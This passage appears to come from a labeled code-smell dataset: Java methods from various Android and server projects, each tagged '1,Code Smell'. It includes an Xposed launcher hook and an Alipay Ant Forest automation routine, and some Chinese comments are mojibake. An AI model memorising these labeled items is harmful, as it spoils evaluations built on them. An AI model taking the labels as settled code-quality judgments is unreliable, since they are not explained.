    cfCountUserQuery.setEndDate(null);
  }
  if (cfCountUserQuery.getYear().equals("""") || cfCountUserQuery.getYear().equals(""null"")) {
    cfCountUserQuery.setYear(null);
  }
  if (cfCountUserQuery.getMonth().equals("""") || cfCountUserQuery.getMonth().equals(""null"")) {
    cfCountUserQuery.setMonth(null);
  }
  if (cfCountUserQuery.getDay().equals("""") || cfCountUserQuery.getDay().equals(""null"")) {
    cfCountUserQuery.setDay(null);
  }
  List<CountByDay> list=null;
switch (cfCountUserQuery.getCountType()) {
case ""before_day_count_by_day"":
    list=cfUserService.limitDaysCountByDay(cfCountUserQuery);
  break;
case ""month_count_by_day"":
list=cfUserService.yearMonthCountByDay(cfCountUserQuery);
break;
case ""year_count_by_month"":
list=cfUserService.yearCountByMonth(cfCountUserQuery);
break;
}
if (list == null || list.size() == 0) {
return new ResponseResult(CommonCode.NO_MORE_DATAS);
}
return new ResponseResult(CommonCode.SUCCESS,list,cfUserService.getCountByQuery(new CfUserQuery()));
}",1,Code Smell
"private void loadStickerSet(){
  if (inputStickerSet != null) {
    final MediaDataController mediaDataController=MediaDataController.getInstance(currentAccount);
    if (stickerSet == null && inputStickerSet.short_name != null) {
      stickerSet=mediaDataController.getStickerSetByName(inputStickerSet.short_name);
    }
    if (stickerSet == null) {
      stickerSet=mediaDataController.getStickerSetById(inputStickerSet.id);
    }
    if (stickerSet == null) {
      TLRPC.TL_messages_getStickerSet req=new TLRPC.TL_messages_getStickerSet();
      req.stickerset=inputStickerSet;
      ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
        reqId=0;
        if (error == null) {
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Transition addTarget=new Transition(){
              @Override public void captureStartValues(              TransitionValues transitionValues){
                transitionValues.values.put(""start"",true);
                transitionValues.values.put(""offset"",containerView.getTop() + scrollOffsetY);
              }
              @Override public void captureEndValues(              TransitionValues transitionValues){
                transitionValues.values.put(""start"",false);
                transitionValues.values.put(""offset"",containerView.getTop() + scrollOffsetY);
              }
              @Override public Animator createAnimator(              ViewGroup sceneRoot,              TransitionValues startValues,              TransitionValues endValues){
                int scrollOffsetY=StickersAlert.this.scrollOffsetY;
                int startValue=(int)startValues.values.get(""offset"") - (int)endValues.values.get(""offset"");
                final ValueAnimator animator=ValueAnimator.ofFloat(0f,1f);
                animator.setDuration(250);
                animator.addUpdateListener(a -> {
                  float fraction=a.getAnimatedFraction();
                  gridView.setAlpha(fraction);
                  titleTextView.setAlpha(fraction);
                  if (startValue != 0) {
                    int value=(int)(startValue * (1f - fraction));
                    setScrollOffsetY(scrollOffsetY + value);
                    gridView.setTranslationY(value);
                  }
                }
);
                return animator;
              }
            }
;
            addTarget.addTarget(containerView);
            TransitionManager.beginDelayedTransition(container,addTarget);
          }
          optionsButton.setVisibility(View.VISIBLE);
          stickerSet=(TLRPC.TL_messages_stickerSet)response;
          showEmoji=!stickerSet.set.masks;
          checkPremiumStickers();
          mediaDataController.preloadStickerSetThumb(stickerSet);
          updateSendButton();
          updateFields();
          updateDescription();
          adapter.notifyDataSetChanged();
        }
 else {
          dismiss();
          if (parentFragment != null) {
            BulletinFactory.of(parentFragment).createErrorBulletin(LocaleController.getString(""AddStickersNotFound"",R.string.AddStickersNotFound)).show();
          }
        }
      }
));
    }
 else {
      if (adapter != null) {
        updateSendButton();
        updateFields();
        adapter.notifyDataSetChanged();
      }
      updateDescription();
      mediaDataController.preloadStickerSetThumb(stickerSet);
      checkPremiumStickers();
    }
  }
  if (stickerSet != null) {
    showEmoji=!stickerSet.set.masks;
  }
  checkPremiumStickers();
}",1,Code Smell
"/** 
 * 鎵�閫夌敤鎴峰垎涓�2绉嶏紝鍙戣捣浜猴紝鎴栬�呬汉鍛橀�夋嫨瀛楁 姣旇緝鏂瑰紡鍒嗕负涓夌锛氫汉鍛樸�侀儴闂ㄣ�佽鑹�
 * @param form
 * @param condition
 * @return
 */
@Override public boolean check(OaProcessExecution execution,JSONObject form,OaProcessNodeCondition condition){
  String fieldId=condition.getId();
  Set<String> formValues=new HashSet<>();
  if (""root"".equals(fieldId)) {
    if (execution != null) {
      OaProcessInstance instance=processInstanceService.getById(execution.getProcessInstId());
      formValues.add(instance.getCreator());
    }
 else {
      formValues.add(eruptUserService.getCurrentAccount());
    }
  }
 else {
    JSONArray jsonArray=form.getJSONArray(condition.getId());
    if (jsonArray != null && jsonArray.size() > 0) {
      for (int i=0; i < jsonArray.size(); i++) {
        formValues.add(jsonArray.getJSONObject(i).getString(""id""));
      }
    }
 else {
      return false;
    }
  }
  String[] value=condition.getValue();
  if (value == null || value.length <= 0) {
    log.error(""鏉′欢娌℃湁瀵圭収鍊�"");
    return false;
  }
  if (formValues == null) {
    log.error(""鍒嗘敮鏉′欢涓嶈兘涓虹┖"");
    return false;
  }
  if (""user"".equals(condition.getCompare())) {
    return compareForUser(formValues,value);
  }
 else   if (""dept"".equals(condition.getCompare())) {
    return compareForDept(formValues,value);
  }
 else   if (""role"".equals(condition.getCompare())) {
    return compareForRole(formValues,value);
  }
  log.error(""姣旇緝绗︽棤娉曡瘑鍒�"" + condition.getCompare());
  return false;
}",1,Code Smell
"public void initSessionFactories(){
  if (sessionFactories == null) {
    sessionFactories=new HashMap<>();
    if (usingRelationalDatabase) {
      initDbSqlSessionFactory();
    }
    addSessionFactory(new GenericManagerFactory(EntityCache.class,EntityCacheImpl.class));
    if (isLoggingSessionEnabled()) {
      if (!sessionFactories.containsKey(LoggingSession.class)) {
        LoggingSessionFactory loggingSessionFactory=new LoggingSessionFactory();
        loggingSessionFactory.setLoggingListener(loggingListener);
        loggingSessionFactory.setObjectMapper(objectMapper);
        sessionFactories.put(LoggingSession.class,loggingSessionFactory);
      }
    }
    commandContextFactory.setSessionFactories(sessionFactories);
  }
 else {
    if (usingRelationalDatabase) {
      initDbSqlSessionFactoryEntitySettings();
    }
  }
  if (customSessionFactories != null) {
    for (    SessionFactory sessionFactory : customSessionFactories) {
      addSessionFactory(sessionFactory);
    }
  }
}
",1,Code Smell
"@Override public double dot(SGDVector other){
  if (other.size() != size) {
    throw new IllegalArgumentException(""Can't dot two vectors of different lengths, this = "" + size + "", other = ""+ other.size());
  }
 else   if (other instanceof SparseVector) {
    double score=0.0;
    if ((other.numActiveElements() != 0) && (indices.length != 0)) {
      Iterator<VectorTuple> itr=iterator();
      Iterator<VectorTuple> otherItr=other.iterator();
      VectorTuple tuple=itr.next();
      VectorTuple otherTuple=otherItr.next();
      while (itr.hasNext() && otherItr.hasNext()) {
        if (tuple.index == otherTuple.index) {
          score+=tuple.value * otherTuple.value;
          tuple=itr.next();
          otherTuple=otherItr.next();
        }
 else         if (tuple.index < otherTuple.index) {
          tuple=itr.next();
        }
 else {
          otherTuple=otherItr.next();
        }
      }
      while (itr.hasNext()) {
        if (tuple.index == otherTuple.index) {
          score+=tuple.value * otherTuple.value;
        }
        tuple=itr.next();
      }
      while (otherItr.hasNext()) {
        if (tuple.index == otherTuple.index) {
          score+=tuple.value * otherTuple.value;
        }
        otherTuple=otherItr.next();
      }
      if (tuple.index == otherTuple.index) {
        score+=tuple.value * otherTuple.value;
      }
    }
    return score;
  }
 else   if (other instanceof DenseVector) {
    double score=0.0;
    for (int i=0; i < indices.length; i++) {
      score+=other.get(indices[i]) * values[i];
    }
    return score;
  }
 else {
    throw new IllegalArgumentException(""Unknown vector subclass "" + other.getClass().getCanonicalName() + "" for input"");
  }
}",1,Code Smell
"public static void patchOverlayColor(ASTParser t,TranslationUnit tree,Root root,GeometryInfoParameters parameters){
  root.processMatches(t,uniformVec4EntityColor,ASTNode::detachAndDelete);
  if (parameters.type.glShaderType == ShaderType.VERTEX) {
    tree.parseAndInjectNodes(t,ASTInjectionPoint.BEFORE_DECLARATIONS,""uniform sampler2D iris_overlay;"",""out vec4 entityColor;"",""out vec4 iris_vertexColor;"",""in ivec2 iris_UV1;"");
    tree.prependMainFunctionBody(t,""vec4 overlayColor = texelFetch(iris_overlay, iris_UV1, 0);"",""entityColor = vec4(overlayColor.rgb, 1.0 - overlayColor.a);"",""iris_vertexColor = iris_Color;"",""entityColor.rgb *= float(entityColor.a != 0.0);"");
  }
 else   if (parameters.type.glShaderType == ShaderType.TESSELATION_CONTROL) {
    root.replaceReferenceExpressions(t,""entityColor"",""entityColor[gl_InvocationID]"");
    tree.parseAndInjectNodes(t,ASTInjectionPoint.BEFORE_DECLARATIONS,""patch out vec4 entityColorTCS;"",""in vec4 entityColor[];"",""out vec4 iris_vertexColorTCS[];"",""in vec4 iris_vertexColor[];"");
    tree.prependMainFunctionBody(t,""entityColorTCS = entityColor[gl_InvocationID];"",""iris_vertexColorTCS[gl_InvocationID] = iris_vertexColor[gl_InvocationID];"");
  }
 else   if (parameters.type.glShaderType == ShaderType.TESSELATION_EVAL) {
    root.replaceReferenceExpressions(t,""entityColor"",""entityColorTCS"");
    tree.parseAndInjectNodes(t,ASTInjectionPoint.BEFORE_DECLARATIONS,""out vec4 entityColorTES;"",""patch in vec4 entityColorTCS;"",""out vec4 iris_vertexColorTES;"",""in vec4 iris_vertexColorTCS[];"");
    tree.prependMainFunctionBody(t,""entityColorTES = entityColorTCS;"",""iris_vertexColorTES = iris_vertexColorTCS[0];"");
  }
 else   if (parameters.type.glShaderType == ShaderType.GEOMETRY) {
    root.replaceReferenceExpressions(t,""entityColor"",""entityColor[0]"");
    tree.parseAndInjectNodes(t,ASTInjectionPoint.BEFORE_DECLARATIONS,""out vec4 entityColorGS;"",""in vec4 entityColor[];"",""out vec4 iris_vertexColorGS;"",""in vec4 iris_vertexColor[];"");
    tree.prependMainFunctionBody(t,""entityColorGS = entityColor[0];"",""iris_vertexColorGS = iris_vertexColor[0];"");
    if (parameters.hasTesselation) {
      root.rename(""iris_vertexColor"",""iris_vertexColorTES"");
      root.rename(""entityColor"",""entityColorTES"");
    }
  }
 else   if (parameters.type.glShaderType == ShaderType.FRAGMENT) {
    tree.parseAndInjectNodes(t,ASTInjectionPoint.BEFORE_DECLARATIONS,""in vec4 entityColor;"",""in vec4 iris_vertexColor;"");
    tree.prependMainFunctionBody(t,""float iris_vertexColorAlpha = iris_vertexColor.a;"");
    if (parameters.hasGeometry) {
      root.rename(""entityColor"",""entityColorGS"");
      root.rename(""iris_vertexColor"",""iris_vertexColorGS"");
    }
 else     if (parameters.hasTesselation) {
      root.rename(""entityColor"",""entityColorTES"");
      root.rename(""iris_vertexColor"",""iris_vertexColorTES"");
    }
  }
}",1,Code Smell
"/** 
 * Determines if the given word is a valid word in the given locale based on the dictionary. It tries hard to find a match: for example, casing is ignored and if the word is present in a more general locale (e.g. en or all locales), and isValidWord is asking for a more specific locale (e.g. en_US), it will be considered a match.
 * @param word the word to match
 * @param inputLocale the locale in which to match the word
 * @return true iff the word has been matched for this locale in the dictionary.
 */
public boolean isValidWord(@Nonnull final String word,@Nonnull final Locale inputLocale){
  if (!isLoaded()) {
    if (DebugFlags.DEBUG_ENABLED) {
      Log.d(mTag,""isValidWord() : Initial load not complete"");
    }
    return false;
  }
  if (DebugFlags.DEBUG_ENABLED) {
    Log.d(mTag,""isValidWord() : Word ["" + word + ""] in Locale [""+ inputLocale+ ""]"");
  }
  final HashMap<String,HashMap<Locale,String>> dictWords=mDictWords;
  final String lowercased=word.toLowerCase(inputLocale);
  final HashMap<Locale,String> dictLocales=dictWords.get(lowercased);
  if (CollectionUtils.isNullOrEmpty(dictLocales)) {
    if (DebugFlags.DEBUG_ENABLED) {
      Log.d(mTag,""isValidWord() : No entry for word ["" + word + ""]"");
    }
    return false;
  }
 else {
    if (DebugFlags.DEBUG_ENABLED) {
      Log.d(mTag,""isValidWord() : Found entry for word ["" + word + ""]"");
    }
    for (    final Locale dictLocale : dictLocales.keySet()) {
      final int matchLevel=LocaleUtils.getMatchLevel(dictLocale.toString(),inputLocale.toString());
      if (DebugFlags.DEBUG_ENABLED) {
        Log.d(mTag,""isValidWord() : MatchLevel for DictLocale ["" + dictLocale + ""] and InputLocale [""+ inputLocale+ ""] is ""+ matchLevel);
      }
      if (LocaleUtils.isMatch(matchLevel)) {
        if (DebugFlags.DEBUG_ENABLED) {
          Log.d(mTag,""isValidWord() : MatchLevel "" + matchLevel + "" IS a match"");
        }
        return true;
      }
      if (DebugFlags.DEBUG_ENABLED) {
        Log.d(mTag,""isValidWord() : MatchLevel "" + matchLevel + "" is NOT a match"");
      }
    }
    if (DebugFlags.DEBUG_ENABLED) {
      Log.d(mTag,""isValidWord() : False, since none of the locales matched"");
    }
    return false;
  }
}
",1,Code Smell
"private static void deleteArea(ControlFlowGraph graph,Area area){
  BasicBlock start=area.start;
  BasicBlock next=area.next;
  if (start == next) {
    return;
  }
  if (next == null) {
    next=graph.getLast();
  }
  Set<BasicBlock> setCommonExceptionHandlers=new HashSet<>(next.getSuccExceptions());
  for (  BasicBlock pred : start.getPreds()) {
    setCommonExceptionHandlers.retainAll(pred.getSuccExceptions());
  }
  boolean is_outside_range=false;
  Set<BasicBlock> setPredecessors=new HashSet<>(start.getPreds());
  for (  BasicBlock pred : setPredecessors) {
    pred.replaceSuccessor(start,next);
  }
  Set<BasicBlock> setBlocks=area.sample;
  Set<ExceptionRangeCFG> setCommonRemovedExceptionRanges=null;
  for (  BasicBlock block : setBlocks) {
    if (graph.getBlocks().containsKey(block.id)) {
      if (!block.getSuccExceptions().containsAll(setCommonExceptionHandlers)) {
        is_outside_range=true;
      }
      Set<ExceptionRangeCFG> setRemovedExceptionRanges=new HashSet<>();
      for (      BasicBlock handler : block.getSuccExceptions()) {
        setRemovedExceptionRanges.add(graph.getExceptionRange(handler,block));
      }
      if (setCommonRemovedExceptionRanges == null) {
        setCommonRemovedExceptionRanges=setRemovedExceptionRanges;
      }
 else {
        setCommonRemovedExceptionRanges.retainAll(setRemovedExceptionRanges);
      }
      if (block.getSeq().isEmpty() && block.getSuccs().size() == 1) {
        BasicBlock succs=block.getSuccs().get(0);
        for (        BasicBlock pred : new ArrayList<>(block.getPreds())) {
          if (!setBlocks.contains(pred)) {
            pred.replaceSuccessor(block,succs);
          }
        }
        if (graph.getFirst() == block) {
          graph.setFirst(succs);
        }
      }
      graph.removeBlock(block);
    }
  }
  if (is_outside_range) {
    BasicBlock emptyblock=new BasicBlock(++graph.last_id);
    graph.getBlocks().addWithKey(emptyblock,emptyblock.id);
    for (    ExceptionRangeCFG range : setCommonRemovedExceptionRanges) {
      emptyblock.addSuccessorException(range.getHandler());
      range.getProtectedRange().add(emptyblock);
    }
    emptyblock.addSuccessor(next);
    for (    BasicBlock pred : setPredecessors) {
      pred.replaceSuccessor(next,emptyblock);
    }
  }
}",1,Code Smell
"@Override public List<NewBeeMallIndexCategoryVO> getCategoriesForIndex(){
  List<NewBeeMallIndexCategoryVO> newBeeMallIndexCategoryVOS=new ArrayList<>();
  List<GoodsCategory> firstLevelCategories=goodsCategoryMapper.selectByLevelAndParentIdsAndNumber(Collections.singletonList(0L),NewBeeMallCategoryLevelEnum.LEVEL_ONE.getLevel(),Constants.INDEX_CATEGORY_NUMBER);
  if (!CollectionUtils.isEmpty(firstLevelCategories)) {
    List<Long> firstLevelCategoryIds=firstLevelCategories.stream().map(GoodsCategory::getCategoryId).collect(Collectors.toList());
    List<GoodsCategory> secondLevelCategories=goodsCategoryMapper.selectByLevelAndParentIdsAndNumber(firstLevelCategoryIds,NewBeeMallCategoryLevelEnum.LEVEL_TWO.getLevel(),0);
    if (!CollectionUtils.isEmpty(secondLevelCategories)) {
      List<Long> secondLevelCategoryIds=secondLevelCategories.stream().map(GoodsCategory::getCategoryId).collect(Collectors.toList());
      List<GoodsCategory> thirdLevelCategories=goodsCategoryMapper.selectByLevelAndParentIdsAndNumber(secondLevelCategoryIds,NewBeeMallCategoryLevelEnum.LEVEL_THREE.getLevel(),0);
      if (!CollectionUtils.isEmpty(thirdLevelCategories)) {
        Map<Long,List<GoodsCategory>> thirdLevelCategoryMap=thirdLevelCategories.stream().collect(groupingBy(GoodsCategory::getParentId));
        List<SecondLevelCategoryVO> secondLevelCategoryVOS=new ArrayList<>();
        for (        GoodsCategory secondLevelCategory : secondLevelCategories) {
          SecondLevelCategoryVO secondLevelCategoryVO=new SecondLevelCategoryVO();
          BeanUtil.copyProperties(secondLevelCategory,secondLevelCategoryVO);
          if (thirdLevelCategoryMap.containsKey(secondLevelCategory.getCategoryId())) {
            List<GoodsCategory> tempGoodsCategories=thirdLevelCategoryMap.get(secondLevelCategory.getCategoryId());
            secondLevelCategoryVO.setThirdLevelCategoryVOS((BeanUtil.copyList(tempGoodsCategories,ThirdLevelCategoryVO.class)));
            secondLevelCategoryVOS.add(secondLevelCategoryVO);
          }
        }
        if (!CollectionUtils.isEmpty(secondLevelCategoryVOS)) {
          Map<Long,List<SecondLevelCategoryVO>> secondLevelCategoryVOMap=secondLevelCategoryVOS.stream().collect(groupingBy(SecondLevelCategoryVO::getParentId));
          for (          GoodsCategory firstCategory : firstLevelCategories) {
            NewBeeMallIndexCategoryVO newBeeMallIndexCategoryVO=new NewBeeMallIndexCategoryVO();
            BeanUtil.copyProperties(firstCategory,newBeeMallIndexCategoryVO);
            if (secondLevelCategoryVOMap.containsKey(firstCategory.getCategoryId())) {
              List<SecondLevelCategoryVO> tempGoodsCategories=secondLevelCategoryVOMap.get(firstCategory.getCategoryId());
              newBeeMallIndexCategoryVO.setSecondLevelCategoryVOS(tempGoodsCategories);
              newBeeMallIndexCategoryVOS.add(newBeeMallIndexCategoryVO);
            }
          }
        }
      }
    }
    return newBeeMallIndexCategoryVOS;
  }
 else {
    return null;
  }
}",1,Code Smell
"private void validateSinkMultiple(DataType physicalDataType,boolean multipleSink,String sinkMultipleFormat,String databasePattern,String tablePattern,boolean enableSchemaChange,String schemaChangePolicies){
  if (multipleSink) {
    if (StringUtils.isBlank(databasePattern)) {
      throw new ValidationException(""The option 'sink.multiple.database-pattern'"" + "" is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    if (StringUtils.isBlank(tablePattern)) {
      throw new ValidationException(""The option 'sink.multiple.table-pattern' "" + ""is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    if (StringUtils.isBlank(sinkMultipleFormat)) {
      throw new ValidationException(""The option 'sink.multiple.format' "" + ""is not allowed blank when the option 'sink.multiple.enable' is 'true'"");
    }
    DynamicSchemaFormatFactory.getFormat(sinkMultipleFormat);
    Set<String> supportFormats=DynamicSchemaFormatFactory.SUPPORT_FORMATS.keySet();
    if (!supportFormats.contains(sinkMultipleFormat)) {
      throw new ValidationException(String.format(""Unsupported value '%s' for '%s'. "" + ""Supported values are %s."",sinkMultipleFormat,SINK_MULTIPLE_FORMAT.key(),supportFormats));
    }
    if (physicalDataType.getLogicalType() instanceof VarBinaryType) {
      throw new ValidationException(""Only supports 'BYTES' or 'VARBINARY(n)' of PhysicalDataType "" + ""when the option 'sink.multiple.enable' is 'true'"");
    }
    if (enableSchemaChange) {
      Map<SchemaChangeType,SchemaChangePolicy> policyMap=SchemaChangeUtils.deserialize(schemaChangePolicies);
      for (      Entry<SchemaChangeType,SchemaChangePolicy> kv : policyMap.entrySet()) {
        List<SchemaChangePolicy> policies=SUPPORTS_POLICY_MAP.get(kv.getKey());
        if (policies == null) {
          throw new ValidationException(String.format(""Unsupported type of schemage-change: %s"",kv.getKey()));
        }
        if (!policies.contains(kv.getValue())) {
          throw new ValidationException(String.format(""Unsupported policy of schemage-change: %s"",kv.getValue()));
        }
      }
    }
  }
}
",1,Code Smell
"private void createCamera(final SurfaceTexture surfaceTexture){
  AndroidUtilities.runOnUIThread(() -> {
    if (cameraThread == null) {
      return;
    }
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""create camera session"");
    }
    surfaceTexture.setDefaultBufferSize(previewSize.getWidth(),previewSize.getHeight());
    cameraSession=new CameraSession(selectedCamera,previewSize,pictureSize,ImageFormat.JPEG,true);
    cameraThread.setCurrentSession(cameraSession);
    CameraController.getInstance().openRound(cameraSession,surfaceTexture,() -> {
      if (cameraSession != null) {
        boolean updateScale=false;
        try {
          Camera.Size size=cameraSession.getCurrentPreviewSize();
          if (size.width != previewSize.getWidth() || size.height != previewSize.getHeight()) {
            previewSize=new Size(size.width,size.height);
            FileLog.d(""change preview size to w = "" + previewSize.getWidth() + "" h = ""+ previewSize.getHeight());
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        try {
          Camera.Size size=cameraSession.getCurrentPictureSize();
          if (size.width != pictureSize.getWidth() || size.height != pictureSize.getHeight()) {
            pictureSize=new Size(size.width,size.height);
            FileLog.d(""change picture size to w = "" + pictureSize.getWidth() + "" h = ""+ pictureSize.getHeight());
            updateScale=true;
          }
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""camera initied"");
        }
        cameraSession.setInitied();
        if (updateScale) {
          if (cameraThread != null) {
            cameraThread.reinitForNewCamera();
          }
        }
      }
    }
,() -> {
      if (cameraThread != null) {
        cameraThread.setCurrentSession(cameraSession);
      }
    }
);
  }
);
}
",1,Code Smell
"@Nullable public DiscoveredPath findPathTo(GlobalStation destination,double maxCost){
  ArrayList<GlobalStation> destinations=new ArrayList<>();
  destinations.add(destination);
  return findPathTo(destinations,maxCost);
}
@Nullable public DiscoveredPath findPathTo(ArrayList<GlobalStation> destinations,double maxCost){
  TrackGraph graph=train.graph;
  if (graph == null)   return null;
  Couple<DiscoveredPath> results=Couple.create(null,null);
  for (  boolean forward : Iterate.trueAndFalse) {
    if (this.destination != null && destinationBehindTrain == forward)     continue;
    TravellingPoint initialPoint=forward ? train.carriages.get(0).getLeadingPoint() : train.carriages.get(train.carriages.size() - 1).getTrailingPoint();
    TrackEdge initialEdge=forward ? initialPoint.edge : graph.getConnectionsFrom(initialPoint.node2).get(initialPoint.node1);
    search(Double.MAX_VALUE,maxCost,forward,destinations,(distance,cost,reachedVia,currentEntry,globalStation) -> {
      for (      GlobalStation destination : destinations) {
        if (globalStation == destination) {
          TrackEdge edge=currentEntry.getSecond();
          TrackNode node1=currentEntry.getFirst().getFirst();
          TrackNode node2=currentEntry.getFirst().getSecond();
          List<Couple<TrackNode>> currentPath=new ArrayList<>();
          Pair<Boolean,Couple<TrackNode>> backTrack=reachedVia.get(edge);
          Couple<TrackNode> toReach=Couple.create(node1,node2);
          TrackEdge edgeReached=edge;
          while (backTrack != null) {
            if (edgeReached == initialEdge)             break;
            if (backTrack.getFirst())             currentPath.add(0,toReach);
            toReach=backTrack.getSecond();
            edgeReached=graph.getConnection(toReach);
            backTrack=reachedVia.get(edgeReached);
          }
          double position=edge.getLength() - destination.getLocationOn(edge);
          double distanceToDestination=distance - position;
          results.set(forward,new DiscoveredPath((forward ? 1 : -1) * distanceToDestination,cost,currentPath,destination));
          return true;
        }
      }
      return false;
    }
);
  }
  DiscoveredPath front=results.getFirst();
  DiscoveredPath back=results.getSecond();
  boolean frontEmpty=front == null;
  boolean backEmpty=back == null;
  boolean canDriveForward=train.hasForwardConductor() || train.runtime.paused;
  boolean canDriveBackward=train.doubleEnded && train.hasBackwardConductor() || train.runtime.paused;
  if (backEmpty || !canDriveBackward)   return canDriveForward ? front : null;
  if (frontEmpty || !canDriveForward)   return canDriveBackward ? back : null;
  boolean frontBetter=maxCost == -1 ? -back.distance > front.distance : back.cost > front.cost;
  return frontBetter ? front : back;
}",1,Code Smell
"private void setAvatar(MessageObject messageObject){
  if (messageObject == null) {
    return;
  }
  if (isAvatarVisible) {
    if (messageObject.customAvatarDrawable != null) {
      avatarImage.setImageBitmap(messageObject.customAvatarDrawable);
    }
 else     if (currentUser != null) {
      if (currentUser.photo != null) {
        currentPhoto=currentUser.photo.photo_small;
      }
 else {
        currentPhoto=null;
      }
      post(() -> {
        avatarDrawable.setInfo(currentUser);
        avatarImage.setForUserOrChat(currentUser,avatarDrawable,null,LiteMode.isEnabled(LiteMode.FLAGS_CHAT),VectorAvatarThumbDrawable.TYPE_SMALL);
      }
);
    }
 else     if (currentChat != null) {
      if (currentChat.photo != null) {
        currentPhoto=currentChat.photo.photo_small;
      }
 else {
        currentPhoto=null;
      }
      post(() -> {
        avatarDrawable.setInfo(currentChat);
        avatarImage.setForUserOrChat(currentChat,avatarDrawable);
      }
);
    }
 else     if (messageObject != null && messageObject.isSponsored()) {
      if (messageObject.sponsoredChatInvite != null && messageObject.sponsoredChatInvite.chat != null) {
        post(() -> {
          avatarDrawable.setInfo(messageObject.sponsoredChatInvite.chat);
          avatarImage.setForUserOrChat(messageObject.sponsoredChatInvite.chat,avatarDrawable);
        }
);
      }
 else {
        avatarDrawable.setInfo(messageObject.sponsoredChatInvite);
        if (messageObject.sponsoredChatInvite != null) {
          TLRPC.Photo photo=messageObject.sponsoredChatInvite.photo;
          if (photo != null) {
            avatarImage.setImage(ImageLocation.getForPhoto(photo.sizes.get(0),photo),""50_50"",avatarDrawable,null,null,0);
          }
        }
      }
    }
 else {
      currentPhoto=null;
      avatarDrawable.setInfo(messageObject.getFromChatId(),null,null);
      avatarImage.setImage(null,null,avatarDrawable,null,null,0);
    }
  }
 else {
    currentPhoto=null;
  }
}",1,Code Smell
"private void showSeekBar(View workspace){
  if (!""Workspace"".equals(workspace.getClass().getSimpleName()))   return;
  boolean isInEditingMode=(boolean)XposedHelpers.callMethod(workspace,""isInNormalEditingMode"");
  View mScreenSeekBar=(View)XposedHelpers.getObjectField(workspace,""mScreenSeekBar"");
  if (mScreenSeekBar == null) {
    logI(TAG,this.lpparam.packageName,""showSeekBar HideSeekPointsHook Cannot find seekbar"");
    return;
  }
  Context mContext=workspace.getContext();
  Handler mHandler=(Handler)XposedHelpers.getAdditionalInstanceField(workspace,""mHandlerEx"");
  if (mHandler == null) {
    mHandler=new Handler(mContext.getMainLooper()){
      @Override public void handleMessage(      @NonNull Message msg){
        View seekBar=(View)msg.obj;
        if (seekBar != null)         seekBar.animate().alpha(0.0f).setDuration(600).withEndAction(() -> seekBar.setVisibility(View.GONE));
      }
    }
;
    XposedHelpers.setAdditionalInstanceField(workspace,""mHandlerEx"",mHandler);
  }
  if (mHandler == null) {
    logI(TAG,this.lpparam.packageName,""showSeekBar HideSeekPointsHook Cannot create handler"");
    return;
  }
  if (mHandler.hasMessages(666))   mHandler.removeMessages(666);
  mScreenSeekBar.animate().cancel();
  if (!isInEditingMode && points == 2) {
    mScreenSeekBar.setAlpha(0.0f);
    mScreenSeekBar.setVisibility(View.GONE);
    return;
  }
  mScreenSeekBar.setVisibility(View.VISIBLE);
  mScreenSeekBar.animate().alpha(1.0f).setDuration(300);
  if (!isInEditingMode) {
    Message msg=Message.obtain(mHandler,666);
    msg.obj=mScreenSeekBar;
    mHandler.sendMessageDelayed(msg,1500);
  }
}",1,Code Smell
"private void initSpanSizes(Module module){
  if (mSpanSizes.containsKey(module)) {
    return;
  }
  if (getMeasuredWidth() == 0) {
    throw new IllegalStateException();
  }
  List<Integer> spanSizes=new ArrayList<>();
  for (  Property property : mSelectedModule.getProperties()) {
    int width=Math.max(getTextWidth(property.getKey()),getTextWidth(property.getSummary()));
    if (mGridDividerView != null) {
      width+=mGridDividerView.getIntrinsicWidth() * 2;
    }
    int spanSize=(int)Math.ceil(width / ((double)getMeasuredWidth() / SPAN_COUNT));
    spanSizes.add(Math.min(spanSize,2));
  }
  int column=0;
  for (int i=0; i < spanSizes.size(); i++) {
    int spanSize=spanSizes.get(i);
    if (spanSize + column > SPAN_COUNT) {
      spanSizes.set(i - 1,2);
      column=spanSize;
    }
 else {
      column+=spanSize;
    }
    if (column == SPAN_COUNT) {
      column=0;
    }
  }
  mSpanSizes.put(module,spanSizes);
}",1,Code Smell
"public List<String[]> customSort(List<String> custom,List<String[]> data,int index){
  List<String[]> res=new ArrayList<>();
  List<Integer> indexArr=new ArrayList<>();
  List<String[]> joinArr=new ArrayList<>();
  for (int i=0; i < custom.size(); i++) {
    String ele=custom.get(i);
    for (int j=0; j < data.size(); j++) {
      String[] d=data.get(j);
      if (StringUtils.equalsIgnoreCase(ele,d[index])) {
        joinArr.add(d);
        indexArr.add(j);
      }
    }
  }
  List<Integer> indexArrData=new ArrayList<>();
  for (int i=0; i < data.size(); i++) {
    indexArrData.add(i);
  }
  List<Integer> indexResult=new ArrayList<>();
  for (int i=0; i < indexArrData.size(); i++) {
    if (!indexArr.contains(indexArrData.get(i))) {
      indexResult.add(indexArrData.get(i));
    }
  }
  List<String[]> subArr=new ArrayList<>();
  for (int i=0; i < indexResult.size(); i++) {
    subArr.add(data.get(indexResult.get(i)));
  }
  res.addAll(joinArr);
  res.addAll(subArr);
  return res;
}",1,Code Smell
"@Override public void run(){
  try {
    while (FriendIdMap.getCurrentUid() == null || FriendIdMap.getCurrentUid().isEmpty())     Thread.sleep(100);
    String s=AntCooperateRpcCall.queryUserCooperatePlantList();
    if (s == null) {
      Thread.sleep(RandomUtils.delay());
      s=AntCooperateRpcCall.queryUserCooperatePlantList();
    }
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      int userCurrentEnergy=jo.getInt(""userCurrentEnergy"");
      JSONArray ja=jo.getJSONArray(""cooperatePlants"");
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        String cooperationId=jo.getString(""cooperationId"");
        if (!jo.has(""name"")) {
          s=AntCooperateRpcCall.queryCooperatePlant(cooperationId);
          jo=new JSONObject(s).getJSONObject(""cooperatePlant"");
        }
        String name=jo.getString(""name"");
        int waterDayLimit=jo.getInt(""waterDayLimit"");
        CooperationIdMap.putIdMap(cooperationId,name);
        if (!Statistics.canCooperateWaterToday(FriendIdMap.getCurrentUid(),cooperationId))         continue;
        int index=-1;
